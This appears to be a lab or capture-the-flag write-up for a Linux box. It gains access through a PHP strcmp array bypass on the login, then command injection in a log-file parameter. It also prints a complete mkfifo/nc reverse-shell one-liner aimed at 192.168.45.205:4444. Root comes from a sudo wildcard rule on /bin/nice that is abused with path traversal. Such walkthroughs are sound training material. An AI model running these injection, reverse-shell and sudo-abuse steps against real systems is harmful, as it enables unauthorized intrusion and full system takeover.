Foothold

The line 10 shows us vulnerable code. The code strcmp($_POST['password'], $pass) == 0) is actually attackable because if we provide array for password parameter, php code evaluate it like strcmp(array(), "some_password") = NULL. Then, we can bypass this string check.

Launch burpsuite and change the parameter 'password' into 'password[]'.

Then, we got url navigates us to dashboard.

On the dashboard, I found file parsing function on the Logs page.

Again, I stopped the get request, and changed file parameter into file=log_01.txt;ls for command injection test, and it successfully listed current directory files. Using this, we can get reverse shell.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.205 4444 >/tmp/f

I encoded above code into url encode with burpsute, and launched nc -lvpn 4444.

Then, I added the encoded reverse shell code after file=log_01.txt;.

└─$ nc -lvnp 4444

We can run shell file as root.

Observing the command we can run as root, we can run command /bin/nice /notes/*, which we can run arbitrary file because * allows us to use path traversal technique like '/notes/../../../tmp/rev.sh'.

Therefore, I created bash generating file named rev.sh, and ran it with sudo.

webadmin@serv:/notes$ nano /tmp/bash.sh
#!/bin/bash
bash
webadmin@serv:/notes$ chmod +x /tmp/bash.sh

Then run it.

webadmin@serv:/tmp$ sudo /bin/nice /notes/../../../../tmp/bash.sh
root@serv:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

I got root user. You can find proof flag on /root/proof.txt.
